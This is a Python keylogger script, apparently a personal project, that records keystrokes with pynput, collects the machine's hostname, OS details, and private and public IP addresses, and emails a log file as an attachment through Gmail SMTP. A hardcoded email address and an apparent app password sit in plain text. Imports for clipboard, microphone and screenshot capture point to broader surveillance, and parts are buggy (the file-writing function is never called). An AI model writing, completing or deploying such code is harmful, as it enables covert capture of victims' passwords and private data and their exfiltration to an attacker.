# librabries

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process
from PIL import ImageGrab
from scipy.stats import false_discovery_control

keys_information = "key_log.txt"
system_information = "systeminfo.txt"

email_address = ("wonlypans@gmail.com")
password = ("llry gujd xclh gamt")

toaddr = "wonlypans@gmail.com"

file_path = r"C:\Users\LENOVO\PycharmProjects\PythonProject\keylogger"

extend = "\\"

def send_email(filename, attachment, toaddr):
    fromaddr = email_address

    msg = MIMEMultipart()

    msg['From'] = fromaddr

    msg['To'] = toaddr

    msg['Subject'] = "Log file"

    body = "Hello World!"

    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')

    p.set_payload(attachment.read())

    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)

    s.starttls()

    s.login(fromaddr, password)

    text = msg.as_string()

    s.sendmail(fromaddr, toaddr, text)

    s.quit()

send_email(keys_information, file_path + extend + keys_information, toaddr)

def computer_information():
    with open (file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get('https://api.ipify.org').text
            f.write("Public IP Address: " + public_ip + '\n')

        except Exception:
            f.write("Public IP Address: None" + '\n')

        f.write("Processor : " + (platform.processor()) + '\n')
        f.write("System  : " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine  : " + platform.machine() + '\n')
        f.write("Hostname  : " + socket.gethostname() + '\n')
        f.write("Private IP  : " + IPAddr + '\n')

computer_information()

count = 0
keys = []

def on_press(key):
    global keys, count

    print (key)
    keys.append(key)
    count += 1

def write_file(keys, key_information=None):
    with open(file_path + extend + key_information, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write(k + "\n")
                f.close()
            elif k.find("key") == -1:
                f.write(k + "\n")
                f.close()

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
